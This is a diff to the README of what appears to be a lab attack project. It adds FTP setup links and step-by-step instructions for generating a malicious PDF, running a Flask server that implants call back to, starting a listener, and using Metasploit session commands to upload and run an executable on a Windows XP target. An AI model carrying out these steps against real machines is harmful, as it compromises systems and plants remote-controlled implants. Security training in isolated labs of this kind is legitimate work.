@@ -23,6 +23,16 @@ Free Windows XP .iso file [here](https://eprebys.faculty.ucdavis.edu/2020/04/08/
 
           Use 'ip addr show' and locate the host network IP
 
+## Setting up vsftpd for the Apache2 server file location
+
+Follow the following videos in order
+
+1. Set up vsftpd [here](https://youtu.be/1WVBC0KBOeE?list=PLeiTQKKRIIRqCkCFe-xL8ohp5Euh8Jxqd)
+
+2. Securing FTP server [here](https://youtu.be/N7hwrPiji3c?list=PLeiTQKKRIIRqCkCFe-xL8ohp5Euh8Jxqd)
+
+3. Upload to Apache2 server using FTP [here](https://youtu.be/Np_OUB4gvc4?list=PLeiTQKKRIIRqCkCFe-xL8ohp5Euh8Jxqd)
+
 ## Setting up and running any of the shell scripts
 
           chmod +x <script name>
@@ -37,18 +47,24 @@ Free Windows XP .iso file [here](https://eprebys.faculty.ucdavis.edu/2020/04/08/
   
           ./generate_malicious_pdf.sh
 
-2. Start listener by running the listener.sh script
+2. Start flask server that is responsible for communicating with implants
+          
+          Make note of the IP and port that the flask server is running on so that the implants know where to communicate back to 
+
+3. Start listener by running the listener.sh script
   
           chmod +x listener.sh
           
           ./listener.sh
-  
-3. Upload the upload_exe.rc file to the target machine via session
+
+4. Download and open the malicious PDF on the target machine
+
+5. Upload the upload_exe.rc file to the target machine via session
   
           sessions -i 1
   
           upload upload_exe.rc
   
-4. Run the resource script in order to upload and run the executable
+6. Run the resource script in order to upload and run the executable
   
           resource upload_exe.rc
